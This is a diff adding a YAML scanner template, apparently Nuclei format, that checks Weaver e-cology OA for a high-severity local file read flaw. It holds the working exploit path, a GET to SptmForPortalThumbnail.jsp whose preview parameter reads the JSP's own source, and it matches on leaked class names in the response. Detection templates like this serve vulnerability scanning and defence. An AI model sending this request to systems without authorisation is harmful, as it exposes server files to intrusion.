@@ -1,0 +1,24 @@
+id: yaml-poc-weaver-weaver_e_cology_oa-readfile-CT-479157
+info:
+  name: Yaml Poc Weaver Weaver_E_Cology_Oa Readfile Ct 479157
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_cology_oa-readfile-CT-479157'
+  tags: lfi
+  reference:
+  - http://124.223.89.192/archives/e-cology8-14
+http:
+- method: GET
+  path:
+  - /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - weaver.general.BaseBean
+    - getServletConfig
